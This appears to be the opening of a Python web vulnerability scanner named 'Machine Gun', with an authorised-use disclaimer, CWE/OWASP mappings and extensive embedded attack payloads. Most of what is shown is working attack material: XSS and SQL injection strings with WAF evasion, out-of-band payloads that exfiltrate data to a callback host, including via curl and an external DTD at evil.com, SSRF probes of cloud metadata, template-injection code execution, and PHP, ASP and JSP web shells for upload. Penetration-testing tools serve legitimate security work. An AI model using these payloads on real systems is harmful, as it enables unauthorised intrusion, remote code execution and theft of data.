#!/usr/bin/env python3
# Machine Gun - Web Vulnerability Scanner
# Version: 1.0 (by out_of_face)
#
# HOW TO RUN:
# --------------------------------------------------------------------------------------------------------------------
# Prerequisites: Python 3.8+, aiohttp, beautifulsoup4, lxml, httpx, PyJWT, cryptography, playwright, PyYAML.
# Installation:
#   pip install aiohttp beautifulsoup4 lxml httpx PyJWT cryptography playwright pyyaml
#   playwright install  # This command installs the necessary browser binaries for Playwright
#
# Basic Usage:
#   python machine_gun.py https://example.com
#
# Full-Featured Example (Full Scan, Extreme Payload Level, Max Verbosity, Auth, Proxy, Specific Modules, Config File):
#   python machine_gun.py https://testphp.vulnweb.com --profile full --payload-level extreme -vvvv \
#     --log-file machine_gun_scan.log --auth-cookie "sessionid=abc; csrf_token=xyz" \
#     --proxy "http://127.0.0.1:8080" --scan-modules xss,sqli,idor,-lfi \
#     --interactsh-server "https://interactsh.com" --config custom_config.yaml \
#     --enable-browser-scan --login-url "https://example.com/login" --username "testuser" --password "testpass"
#
# Ethical Hacking Disclaimer:
#   This tool is intended for educational purposes and for use ONLY on systems where you have explicit,
#   written authorization from the system owner to conduct security testing. Unauthorized scanning and testing
#   of web applications is illegal and unethical. The user assumes all responsibility and liability for any
#   actions taken using this tool. The author and AI assistant are not responsible for any misuse or damage
#   caused by this tool. Always operate responsibly, ethically, and legally. USE WITH EXTREME CAUTION.
#   A "zero mistake rate" is an ideal, not a guarantee; always verify findings manually. Minimal harm is a priority.
# --------------------------------------------------------------------------------------------------------------------

import argparse
import asyncio
import aiohttp
import os
import re
import time
import json
import zlib
import base64
import hashlib
import statistics
import sys
import socket
import logging
import random
import inspect
import difflib
import uuid
import yaml # For configuration file support
from urllib.parse import urljoin, urlparse, parse_qs, quote_plus, unquote_plus, quote, unquote, urlencode
from html import escape
from typing import List, Dict, Any, Tuple, Set, Optional, Callable, Union, Deque, Pattern, AsyncGenerator, NamedTuple
from collections import deque, Counter
from dataclasses import dataclass, field, asdict

# For robust HTML parsing (MUST BE INSTALLED: pip install beautifulsoup4 lxml)
from bs4 import BeautifulSoup, Comment

# For Interactsh client (MUST BE INSTALLED: pip install httpx)
import httpx

# For JWT (MUST BE INSTALLED: pip install PyJWT cryptography)
import jwt
from jwt.exceptions import DecodeError, InvalidTokenError

# For Headless Browser Automation (MUST BE INSTALLED: pip install playwright && playwright install)
from playwright.async_api import async_playwright, Page, Browser, TimeoutError as PlaywrightTimeoutError, Error as PlaywrightError

# --- Core Configuration & Constants ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 MachineGun/1.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15 MachineGun/1.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0 MachineGun/1.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 MachineGun/1.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 MachineGun/1.0"
]
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.linkedin.com/"
]

DOWNLOADS_FOLDER = os.path.expanduser("~/Downloads/MachineGun_Reports") # Updated folder name
DEFAULT_TIMEOUT = 30 # HTTP request timeout
DEFAULT_CRAWL_DEPTH = 3
DEFAULT_MAX_URLS_TO_SCAN = 200 # Increased for more discovery
DEFAULT_CONCURRENCY = 20 # Increased initial concurrency
MAX_CONCURRENCY = 80 # Increased max concurrency
TIME_BASED_BLIND_DELAY = 8 # Increased for higher reliability
BOOLEAN_DIFF_THRESHOLD = 0.90 # Lower threshold means more distinct responses are required
PAYLOAD_LEVEL_MAP = {"low": 10, "medium": 30, "high": 100, "extreme": 500} # Increased payload counts
DEFAULT_PAYLOAD_LEVEL = "medium"
MAX_JS_FILE_SIZE_FOR_ANALYSIS = 5 * 1024 * 1024 # 5MB limit for JS analysis (increased)
SOFT_404_DIFF_THRESHOLD = 0.95 # Higher threshold means more similar to be considered soft 404
BASELINE_SAMPLES = 15 # Increased for more stable baseline
ADAPTIVE_CONCURRENCY_ERROR_THRESHOLD = 0.15 # 15% error rate
ADAPTIVE_CONCURRENCY_LATENCY_THRESHOLD_MULTIPLIER = 2.0 # 2.0x the average latency
RACE_CONDITION_REQUEST_BURST = 25 # Increased burst for race conditions
RACE_CONDITION_WINDOW_MS = 1000 # Increased window for race conditions
PLAYWRIGHT_TIMEOUT = 20000 # Playwright navigation/action timeout in milliseconds (increased)
PLAYWRIGHT_DOM_XSS_MARKER = "MACHINE_GUN_XSS_MARKER_" # Unique marker for DOM XSS detection

# Interactsh Configuration
INTERACTSH_SERVER = "https://interactsh.com" # Default Interactsh server
INTERACTSH_POLLING_INTERVAL = 10 # seconds

# --- Terminal Coloring (ANSI Escape Codes) ---
class AnsiColors:
    """A simple class to hold ANSI color codes for terminal output."""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    _enabled = sys.stdout.isatty()

    @classmethod
    def enable(cls):
        cls._enabled = True

    @classmethod
    def disable(cls):
        cls._enabled = False

    @classmethod
    def colorize(cls, text: str, color: str) -> str:
        return f"{color}{text}{cls.ENDC}" if cls._enabled else text

# --- CWE & OWASP Mapping (Comprehensive for v1.0) ---
CWE_MAPPING = {
    # Injection
    "Reflected XSS": "CWE-79", "Stored XSS": "CWE-79", "DOM XSS": "CWE-79", "Header-Based XSS": "CWE-79",
    "SQL Injection": "CWE-89", "Time-Based Blind SQLi": "CWE-89", "Boolean-Based Blind SQLi": "CWE-89", "Error-Based SQLi": "CWE-89", "OOB SQLi": "CWE-89",
    "NoSQL Injection": "CWE-943",
    "Command Injection": "CWE-77", "Blind Command Injection": "CWE-78", "OOB Command Injection": "CWE-78",
    "Server-Side Template Injection (SSTI)": "CWE-1336",
    "XML External Entity (XXE) Injection": "CWE-611", "OOB XXE": "CWE-611",
    "CRLF Injection": "CWE-93", "HTTP Response Splitting": "CWE-93",
    "Insecure Deserialization": "CWE-502",
    "HTTP Request Smuggling": "CWE-444",
    "Host Header Injection": "CWE-20",
    "Log Injection": "CWE-117",
    "API Parameter Fuzzing": "CWE-20", # Broad category for API issues
    "HTTP Method Not Allowed": "CWE-20",
    "CORS Misconfiguration": "CWE-346", # OWASP A05:2021 Security Misconfiguration
    "Client-Side Open Redirect": "CWE-601",
    # Broken Access Control
    "IDOR (Insecure Direct Object Reference)": "CWE-639", "BOLA (Broken Object Level Authorization)": "CWE-285",
    "Potential Auth Bypass": "CWE-284", "Authentication Bypass Heuristic": "CWE-287",
    "Local File Inclusion (LFI)": "CWE-22", "Path Traversal": "CWE-22",
    "Open Redirect": "CWE-601",
    "SSRF (Server-Side Request Forgery)": "CWE-918", "OOB SSRF": "CWE-918",
    "Race Condition": "CWE-362",
    "Insecure File Upload": "CWE-434",
    "Subdomain Takeover": "CWE-346",
    "Parameter Tampering": "CWE-472", # For business logic
    # Cryptographic Failures
    "Weak JWT Secret": "CWE-345", "JWT Algorithm None": "CWE-347", "Padding Oracle": "CWE-208",
    # Security Misconfiguration
    "Security Headers Missing/Misconfigured": "CWE-693", "CSP Missing/Weak": "CWE-693", "HSTS Header Missing": "CWE-319",
    "CORS Misconfiguration": "CWE-942", # Already mapped above, but keeping for clarity
    "Directory Listing Enabled": "CWE-548",
    "TRACE/TRACK Method Enabled": "CWE-16",
    "GraphQL Introspection Enabled": "CWE-200",
    "HTTP Verb Tampering": "CWE-284",
    # Vulnerable and Outdated Components
    "Vulnerable Component Version": "CWE-1104",
    # Identification and Authentication Failures
    "Missing HttpOnly Cookie Attribute": "CWE-1004", "Missing Secure Cookie Attribute": "CWE-614", "Weak SameSite Cookie Attribute": "CWE-1275",
    # Software and Data Integrity Failures
    "Prototype Pollution": "CWE-1321",
    "DOM Clobbering Potential": "CWE-20",
    # Security Logging and Monitoring Failures (Implied by verbose errors)
    "Information Disclosure (Error Messages)": "CWE-209", "Information Disclosure (Stack Trace)": "CWE-209",
    "Sensitive Data Exposure in JS": "CWE-200", "API Key in JS": "CWE-312", "Hardcoded Credentials": "CWE-798",
    "Sensitive Data in Local/Session Storage": "CWE-200", # New for client-side
    # Business Logic
    "Excessive Data Exposure": "CWE-200",
}

OWASP_TOP_10_2021_MAPPING = {
    "CWE-89": "A03:2021-Injection", "CWE-79": "A03:2021-Injection", "CWE-77": "A03:2021-Injection", "CWE-943": "A03:2021-Injection", "CWE-1336": "A03:2021-Injection", "CWE-611": "A03:2021-Injection", "CWE-93": "A03:2021-Injection", "CWE-502": "A08:2021-Software and Data Integrity Failures", "CWE-444": "A03:2021-Injection", "CWE-117": "A09:2021-Security Logging and Monitoring Failures", "CWE-20": "A04:2021-Insecure Design", # Broad mapping for new API/Generic issues
    "CWE-22": "A01:2021-Broken Access Control", "CWE-284": "A01:2021-Broken Access Control", "CWE-285": "A01:2021-Broken Access Control", "CWE-639": "A01:2021-Broken Access Control", "CWE-601": "A01:2021-Broken Access Control", "CWE-918": "A10:2021-Server-Side Request Forgery (SSRF)", "CWE-362": "A01:2021-Broken Access Control", "CWE-434": "A01:2021-Broken Access Control", "CWE-346": "A05:2021-Security Misconfiguration", "CWE-472": "A04:2021-Insecure Design",
    "CWE-345": "A02:2021-Cryptographic Failures", "CWE-347": "A02:2021-Cryptographic Failures", "CWE-208": "A02:2021-Cryptographic Failures",
    "CWE-1104": "A06:2021-Vulnerable and Outdated Components",
    "CWE-287": "A07:2021-Identification and Authentication Failures", "CWE-1004": "A07:2021-Identification and Authentication Failures", "CWE-614": "A07:2021-Identification and Authentication Failures", "CWE-1275": "A07:2021-Identification and Authentication Failures",
    "CWE-1321": "A08:2021-Software and Data Integrity Failures",
    "CWE-209": "A09:2021-Security Logging and Monitoring Failures",
    "CWE-693": "A05:2021-Security Misconfiguration", "CWE-942": "A05:2021-Security Misconfiguration", "CWE-548": "A05:2021-Security Misconfiguration", "CWE-16": "A05:2021-Security Misconfiguration",
    "CWE-200": "A04:2021-Insecure Design", "CWE-312": "A04:2021-Insecure Design", "CWE-798": "A04:2021-Insecure Design",
}

# --- Embedded Payloads & Wordlists (Consolidated and Expanded) ---

XSS_PAYLOADS = [
    # Polyglots & Basic
    "jaVasCript:/*-/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert('XSS-MG-POLY')//>",
    "-->\"><script>alert('XSS-MG-SCRIPT')</script>",
    "'\"><svg/onload=alert('XSS-MG-SVG')>",
    # Event Handlers
    "<details/open/ontoggle=alert('XSS-MG-DETAILS')>",
    "<img src=x onerror=alert('XSS-MG-IMG')>",
    "<body onpageshow=alert('XSS-MG-BODY')>",
    "<div onpointerover=alert('XSS-MG-POINTER')>XSS</div>",
    "<iframe srcdoc='<script>alert(\"XSS-MG-IFRAME\")</script>'></iframe>",
    # JS Contexts
    "'-alert('XSS-MG-JS-S')-'",
    "\"-alert('XSS-MG-JS-D')-\"",
    "`-alert('XSS-MG-JS-T')-`",
    "\\'-alert('XSS-MG-JS-ESC')//",
    "';alert('XSS-MG-JS-SEMICOLON')//",
    # Obfuscated & Encoding Variations
    "<sCrIpt>alert('XSS-MG-CASE')</sCrIpt>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,45,77,71,45,67,72,65,82,39,41))</script>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTLU1HLUJBU0U2NCcpPC9zY3JpcHQ+=\">Click Me</a>",
    "&#x3C;script&#x3E;alert(&#x27;XSS-MG-HTMLENT&#x27;)&#x3C;/script&#x3E;",
    "%3Cscript%3Ealert(%27XSS-MG-URLENC%27)%3C/script%3E",
    "%253Cscript%253Ealert(%2527XSS-MG-DOUBLEURL%2527)%253C/script%253E",
    "\\u003cscript\\u003ealert('XSS-MG-UNICODE')\\u003c/script\\u003e",
    # Angle brackets bypass
    "<svg/onload=alert(1)>",
    "<img/src/onerror=alert(1)>",
    # HTML injection
    "<marquee><h1>XSS-MG-MARQUEE</h1></marquee>",
    "<math><mi/xlink:href=data:;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==>",
]

DOM_XSS_PAYLOADS = [
    # Basic injections
    f"javascript:alert('{PLAYWRIGHT_DOM_XSS_MARKER}1')",
    f"data:text/html,<script>alert('{PLAYWRIGHT_DOM_XSS_MARKER}2')</script>",
    f"<img src=x onerror=alert('{PLAYWRIGHT_DOM_XSS_MARKER}3')>",
    f"<svg/onload=alert('{PLAYWRIGHT_DOM_XSS_MARKER}4')>",
    # Sinks in innerHTML/outerHTML/document.write
    f"<script>document.write('<img src=x onerror=alert(\"{PLAYWRIGHT_DOM_XSS_MARKER}5\")>')</script>",
    f"<div id='testdiv'></div><script>document.getElementById('testdiv').innerHTML='<img src=x onerror=alert(\"{PLAYWRIGHT_DOM_XSS_MARKER}6\")>'</script>",
    # Sinks in eval/setTimeout/setInterval
    f"';alert('{PLAYWRIGHT_DOM_XSS_MARKER}7')//",
    f"\");alert('{PLAYWRIGHT_DOM_XSS_MARKER}8')//",
    # URL-based sinks (location.href, window.open)
    f"javascript:alert('{PLAYWRIGHT_DOM_XSS_MARKER}9')",
    f"data:text/html;base64,PHNjcmlwdD5hbGVydCgn{base64.b64encode(f'{PLAYWRIGHT_DOM_XSS_MARKER}10'.encode()).decode()}')PC9zY3JpcHQ+=",
    # Event handlers in attributes
    f"<a href='#' onclick='alert(\"{PLAYWRIGHT_DOM_XSS_MARKER}11\")'>Click</a>",
    f"<body onload='alert(\"{PLAYWRIGHT_DOM_XSS_MARKER}12\")'>",
    # Template literal escape
    f"`{PLAYWRIGHT_DOM_XSS_MARKER}13`",
    # HTML entity encoded
    f"&#x3C;script&#x3E;alert(&#x27;{PLAYWRIGHT_DOM_XSS_MARKER}14&#x27;)&#x3C;/script&#x3E;",
    # URL encoded
    f"%3Cscript%3Ealert('%7BMACINE_GUN_DOM_XSS_MARKER%7D15')%3C/script%3E", # Corrected marker
]


SQLI_PAYLOADS = [
    # Error-based
    "'", "\"", "`", "')", "\")", "`)", "||'",
    "' OR 1=CAST((SELECT @@version) AS int)-- -",
    "\" OR 1=CAST((SELECT @@version) AS int)-- -",
    "1' UNION SELECT @@version,NULL,NULL-- -",
    "1\" UNION SELECT @@version,NULL,NULL-- -",
    # Boolean-based blind
    "AND 1=1-- -", "AND 1=2-- -",
    "OR 1=1-- -", "OR 1=2-- -",
    "1 AND 1=1", "1 AND 1=2",
    "1 OR 1=1", "1 OR 1=2",
    # Time-based blind
    f"SLEEP({TIME_BASED_BLIND_DELAY})-- -", # MySQL/PostgreSQL
    f"pg_sleep({TIME_BASED_BLIND_DELAY})-- -", # PostgreSQL
    f"WAITFOR DELAY '0:0:{TIME_BASED_BLIND_DELAY}'--", # MSSQL
    f"' AND (SELECT {TIME_BASED_BLIND_DELAY} FROM PG_SLEEP({TIME_BASED_BLIND_DELAY}))--", # PostgreSQL
    f"benchmark({TIME_BASED_BLIND_DELAY*1000000},MD5(1))-- -", # MySQL CPU intensive
    # Union-based (common columns)
    "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -", # Up to 10 columns
    # WAF Evasion
    "/*!' OR 1=1*/",
    "1' /*!UNION*/ /*!SELECT*/ @@version,NULL-- -",
    "1' %0AUNION%0ASELECT%0A@@version,NULL--%0A-",
    "1' +UNION+ +SELECT+ @@version,NULL--+-",
    "1' ORDER BY 1#", "1' ORDER BY 99#", # Blind order-by
]

OOB_SQLI_PAYLOADS = [
    # DNS Exfiltration (MySQL, PostgreSQL, MSSQL, Oracle)
    f"' || (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@hostname), '.{{INTERACTSH_DOMAIN}}')))-- -", # MSSQL
    f"' || (SELECT pg_send_query(CONCAT('{{INTERACTSH_DOMAIN}}', (SELECT current_database()))))-- -", # PostgreSQL
    f"' || (SELECT utl_http.request('http://{{INTERACTSH_DOMAIN}}/' || user)) FROM DUAL--", # Oracle
    f"' || (SELECT SLEEP(0) FROM DUAL WHERE UTL_HTTP.REQUEST('http://{{INTERACTSH_DOMAIN}}/' || (SELECT user FROM DUAL)) IS NOT NULL)--", # Oracle time-based with OOB
    f"' || (SELECT SUBSTRING(LOAD_FILE(CONCAT('\\\\', (SELECT USER()), '.{{INTERACTSH_DOMAIN}}')),1,1))-- -", # MySQL
    f"' || (SELECT CAST(REPLACE(REPLACE(REPLACE(REPLACE(CONCAT('{{INTERACTSH_DOMAIN}}', (SELECT @@version)), '-', ''), '.', ''), ' ', ''), '/', '') AS DECIMAL))--", # MySQL DNS
]

LFI_PAYLOADS = [
    "/etc/passwd", "c:\\windows\\win.ini",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd", # Double URL Encode
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "file:///etc/passwd",
    "zip:///var/www/html/shell.jpg%23shell.php", # PHP Wrappers
    "phar:///path/to/archive.phar/file.txt",
    "data:text/plain,<?php phpinfo(); ?>",
    "/proc/self/cmdline", "/proc/self/environ", # Linux specific
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -al", "| ls -al", "& ls -al", "&& ls -al",
    "; dir", "| dir", "& dir", "&& dir",
    "`ls -al`", "$(ls -al)",
    "|| ls -al",
    "%0als -al", # Newline
    "|/usr/bin/id", ";/usr/bin/id",
    "| cat /etc/passwd", "; cat /etc/passwd",
    "| type c:\\windows\\win.ini", "; type c:\\windows\\win.ini",
    "| ping -c 1 127.0.0.1", # Linux ping
    "| ping -n 1 127.0.0.1", # Windows ping
]

OOB_CMD_PAYLOADS = [
    f"& ping -c 1 {{INTERACTSH_DOMAIN}}", # Linux
    f"&& ping -c 1 {{INTERACTSH_DOMAIN}}", # Linux
    f"| ping -c 1 {{INTERACTSH_DOMAIN}}", # Linux
    f"; ping -c 1 {{INTERACTSH_DOMAIN}}", # Linux
    f"& ping -n 1 {{INTERACTSH_DOMAIN}}", # Windows
    f"&& ping -n 1 {{INTERACTSH_DOMAIN}}", # Windows
    f"| ping -n 1 {{INTERACTSH_DOMAIN}}", # Windows
    f"; ping -n 1 {{INTERACTSH_DOMAIN}}", # Windows
    f"$(curl {{INTERACTSH_DOMAIN}})", # Bash/Shell
    f"`curl {{INTERACTSH_DOMAIN}}`", # Bash/Shell
]

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://[::1]", "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/", # AWS
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://127.0.0.1:22", "http://127.0.0.1:80", "http://127.0.0.1:443", "http://127.0.0.1:3306", "http://127.0.0.1:8080",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "dict://localhost:6379/info", # Redis
    "gopher://localhost:80/_GET%20/ HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A", # Gopher for HTTP
    "ftp://localhost/etc/passwd",
    # Internal IP ranges
    "http://10.0.0.1", "http://10.255.255.254", # 10.0.0.0/8
    "http://172.16.0.1", "http://172.31.255.254", # 172.16.0.0/12
    "http://192.168.0.1", "http://192.168.255.254", # 192.168.0.0/16
]

OOB_SSRF_PAYLOADS = [
    f"http://{{INTERACTSH_DOMAIN}}",
    f"https://{{INTERACTSH_DOMAIN}}",
    f"dns://{{INTERACTSH_DOMAIN}}",
    f"ftp://{{INTERACTSH_DOMAIN}}/test",
    f"gopher://{{INTERACTSH_DOMAIN}}/_",
]

SSTI_PAYLOADS = [
    # Jinja2 / Twig / Nunjucks (Python/Node.js)
    "{{7*'7'}}", "{{config}}", "{{self.__init__.__globals__['os'].popen('id').read()}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()[0].strip() }}", # Python
    # Freemarker (Java)
    "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "${'a'.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}",
    # Velocity (Java)
    "#set($x='')...#set($rt=$x.class.forName('java.lang.Runtime'))...$rt.exec('id')",
    # ERB (Ruby)
    "<%= `id` %>", "<%= system('id') %>",
    # ASP.NET Razor
    "@System.Diagnostics.Process.Start(\"cmd.exe\", \"/c whoami\").StandardOutput.ReadToEnd()",
    # Generic
    "${7*7}", "<%= 7*7 %>", "{{ 7*7 }}",
]

XXE_PAYLOADS = [
    # In-band
    '<?xml version="1.0" ?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" ?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0" ?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1/server-status">]><foo>&xxe;</foo>',
    # Parameter Entity
    '<?xml version="1.0" ?><!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><root>&exfil;</root>', # Requires external DTD
]

OOB_XXE_PAYLOADS = [
    # Basic OOB
    f'<?xml version="1.0" ?><!DOCTYPE a [<!ENTITY xxe SYSTEM "http://{{INTERACTSH_DOMAIN}}">]><foo>&xxe;</foo>',
    # OOB with file exfiltration
    f'<?xml version="1.0" ?><!DOCTYPE a [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{{INTERACTSH_DOMAIN}}/exfil?data=%file;">%dtd;]><root/>',
    f'<?xml version="1.0" ?><!DOCTYPE a [<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % dtd SYSTEM "http://{{INTERACTSH_DOMAIN}}/exfil?data=%file;">%dtd;]><root/>',
]

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlfinjected=true",
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:25%0d%0a%0d%0a<h1>CRLF Injection Test</h1>",
    "%0d%0aX-Test: CRLF-Injected",
    "%0d%0aLocation: /redirected_by_crlf", # HTTP Response Splitting
]

INSECURE_DESERIALIZATION_PAYLOADS = {
    "java": ["rO0ABXNyABdqYXZhLnV0aWwuSGFzaFNldM", "yro0ABXNyABdqYXZhLnV0aWwuSGFzaFNldM"], # ysoserial gadget chain fragments
    "php": ["O:21:\"phpinfo_object\":0:{}", "O:1:\"A\":1:{s:4:\"data\";s:10:\"phpinfo();\";}"], # Simple PHP deserialization examples
    "python": ["gASVAAAAAPYqAAAAAA", "gASVAAAAAQA="], # Simple Python pickle examples
    "ruby": ["BAh7BjoGZW5jb2RpbmciB0FTS0lp", "BAh7BjoGZW5jb2RpbmciB0FTS0k="], # Ruby Marshal fragments
    ".net": ["AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uV2luZG93cy5Gb3Jtcy", "AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uV2Vi"], # .NET fragments
}

IDOR_COMMON_IDS = ["1", "2", "10", "100", "999", "1000", "1001", "admin", "test", "user", "profile", "guest"]
IDOR_NUMERIC_FUZZ_RANGE = 5 # +/- this value from discovered numeric IDs
IDOR_UUID_FUZZ_COUNT = 3 # Number of random UUIDs to try
IDOR_COMMON_WORDS = ["admin", "test", "user", "guest", "profile", "data", "config", "settings"] # Common words for non-numeric IDs

JWT_COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "jwt", "secretkey", "test", "dev", "prod", "changeit",
    "supersecret", "your-secret-key", "topsecret", "admin123", "qwerty", "default", "web"
]

SUBDOMAIN_TAKEOVER_FINGERPRINTS = {
    "github": "There isn't a GitHub Pages site here.",
    "heroku": "No such app",
    "shopify": "Sorry, this shop is currently unavailable.",
    "aws-s3": "The specified bucket does not exist.",
    "azure": "Sorry, the website you are looking for is not available.",
    "netlify": "Page Not Found",
    "read-the-docs": "Read the Docs has not built a project with this name",
    "pantheon": "The site you are looking for is not here.",
    "wordpress": "Do you want to set up a WordPress site here?",
    "desk.com": "This page is no longer in service.",
    "bitbucket": "Repository not found",
    "fastly": "Fastly error: unknown domain",
    "zendesk": "Help Center Closed",
}

INSECURE_FILE_UPLOAD_PAYLOADS = [
    ("shell.php", "<?php echo shell_exec($_GET['cmd']); ?>"),
    ("shell.php5", "<?php echo shell_exec($_GET['cmd']); ?>"),
    ("shell.phtml", "<?php echo shell_exec($_GET['cmd']); ?>"),
    ("shell.asp", "<% Response.Write CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll() %>"),
    ("shell.aspx", "<%@ Page Language=\"C#\"%><%@ Import Namespace=\"System.Diagnostics\"%><%@ Import Namespace=\"System.IO\"%><%Response.Write(new StreamReader(Process.Start(Request.QueryString[\"cmd\"]).StandardOutput).ReadToEnd());%>"),
    ("shell.jsp", "<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int c; while ((c = in.read()) != -1) out.write(c); %>"),
    ("shell.php.jpg", "shell.php.jpg\x00.php<?php echo shell_exec($_GET['cmd']); ?>"), # Null byte bypass
    ("shell.jpg.php", "shell.jpg.php<?php echo shell_exec($_GET['cmd']); ?>"), # Double extension
    ("shell.html", "<script>alert('XSS-UPLOAD')</script>"), # HTML upload for XSS
    ("shell.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS-UPLOAD-SVG')\"/>"), # SVG for XSS
]

# Common internal IP ranges for SSRF/LFI checks
INTERNAL_IP_RANGES = [
    re.compile(r"^10\.\d{1,3}\.\d{1,3}\.\d{1,3}$"),
    re.compile(r"^172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}$"),
    re.compile(r"^192\.168\.\d{1,3}\.\d{1,3}$"),
    re.compile(r"^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$"),
    re.compile(r"^(?:0\.0\.0\.0|localhost|\[::1\])$")
]

SENSITIVE_DATA_REGEXES = {
    "API_KEY": re.compile(r'(?:api(?:_|-)?key|client(?:_|-)?secret|access(?:_|-)?token|auth(?:_|-)?token|bearer)[\s=:]*[\'"]?([a-zA-Z0-9\-_]{16,90})[\'"]?', re.I),
    "AWS_ACCESS_KEY_ID": re.compile(r'(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}', re.I),
    "AWS_SECRET_ACCESS_KEY": re.compile(r'["\']([A-Za-z0-9/+=]{40})["\']', re.I),
    "GOOGLE_API_KEY": re.compile(r'AIza[0-9A-Za-z\\-_]{35}', re.I),
    "PRIVATE_KEY": re.compile(r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----', re.I),
    "GENERIC_SECRET": re.compile(r'["\']?(secret|token|password|pwd|auth|key|cred)[\'"]?\s*[:=]\s*[\'"]?([\w-]{16,128})[\'"]?', re.I),
    "EMAIL": re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', re.I),
    "IP_ADDRESS": re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'),
    "CREDENTIALS_IN_URL": re.compile(r'(?:user|pass|usr|pwd|username|password)=[^&]+', re.I),
}

ERROR_FINGERPRINTS = {
    "SQL": re.compile(r"SQL syntax|mysql_fetch|ORA-[0-9][0-9][0-9][0-9]|Unclosed quotation mark|Microsoft OLE DB|pg_query\(\)|SQLSTATE\[|syntax error near", re.I),
    "PHP": re.compile(r"<b>Warning</b>:|<b>Fatal error</b>:|<b>Parse error</b>:|Undefined index:|eval\(\)'d code|on line \d+ in", re.I),
    "PYTHON": re.compile(r"Traceback \(most recent call last\)|Django|Flask|TypeError|KeyError|AttributeError|NameError", re.I),
    "JAVA": re.compile(r"java\.lang\.|javax\.servlet|Stacktrace|NullPointerException|ArrayIndexOutOfBoundsException", re.I),
    "DOTNET": re.compile(r"System\.(?:Web|Data|IO)\.|ASP\.NET_SessionId|Microsoft\.Data\.SqlClient", re.I),
    "LFI/PATH_TRAVERSAL": re.compile(r"root:x:0:0:|\[boot loader\]|\[drivers\]|\[system\]|Directory of|volume in drive", re.I),
    "COMMAND_INJECTION": re.compile(r"Volume in drive|Directory of|total \d+|drwx|rwx|uid=\d+\(.*?\) gid=\d+\(.*?\) groups=\d+\(.*?\)", re.I),
    "SSRF_INFO": re.compile(r"iam\/security-credentials|ami-id|instance-id|hostname|local-hostname|public-keys|network-interfaces|computeMetadata", re.I),
    "NO_SQL": re.compile(r"MongoError|SyntaxError: Unexpected token|TypeError: Cannot read property 'map' of undefined", re.I),
    "SSTI": re.compile(r"{{7\*7}}|77|49|{{config}}|freemarker|velocity|twig|jinja2", re.I),
    "XXE": re.compile(r"<!ENTITY|Document Type Definition|external entity", re.I),
}

